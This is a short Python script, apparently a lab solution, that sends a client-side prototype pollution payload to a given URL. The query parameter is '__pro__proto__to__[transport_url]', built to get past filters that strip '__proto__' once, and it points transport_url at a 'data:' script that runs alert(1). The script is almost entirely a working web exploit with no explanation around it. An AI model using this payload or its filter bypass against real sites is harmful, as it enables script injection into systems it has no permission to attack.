import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/?__pro__proto__to__[transport_url]=data:,alert(1);'

requests.get(burp_url)
